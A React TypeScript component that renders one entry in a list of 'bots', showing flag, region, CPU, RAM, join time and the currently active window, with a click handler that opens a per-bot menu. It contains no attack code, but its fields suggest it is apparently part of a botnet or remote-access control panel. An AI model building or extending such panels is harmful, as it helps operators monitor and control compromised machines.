import React, { useState } from "react";
import { BotItem } from "./types";
import "./BotListItem.css";
import moment from "moment";
// import DOMPurify from "dompurify";
interface BotListItemProps {
  bot: BotItem;
  onClickMenu: (
    event: React.MouseEvent<HTMLDivElement>,
    botId: string,
    botVersion: number
  ) => void;
}
function getTimeAgo(time: moment.MomentInput) {
  return moment(time).fromNow();
}

const BotListItem: React.FC<BotListItemProps> = (botProps) => {
  let bot = botProps.bot;

  // const clean = DOMPurify.sanitize;
  const handleClick = (event: React.MouseEvent<HTMLDivElement>) => {
    event.preventDefault();
    const highestVersionInstance = bot.client_instances.reduce(
      (max, instance) => {
        return instance.version > max.version ? instance : max;
      },
      bot.client_instances[0]
    );
    botProps.onClickMenu(event, bot.id, highestVersionInstance.version);
  };

  return (
    <div className="bot" onClick={handleClick} onContextMenu={handleClick}>
      <div className="flag">{bot.flag}</div>
      <div className="name">{bot.name}</div>
      <div className="region">{bot.region}</div>
      <div className="cpu-brand">{bot.cpu_brand}</div>
      <div className="ram">{bot.ram}</div>
      <div className="join-date">{getTimeAgo(bot.join_date)}</div>
      {/* <div className="system-boot-time">{bot.system_boot_time}</div> */}
      {/* <div className="ping">{bot.ping}</div> */}
      <div className="active-window">{bot.active_window}</div>
      {/* <div className="os-info">{bot.os_info}</div> */}
    </div>
  );
};

export default BotListItem;
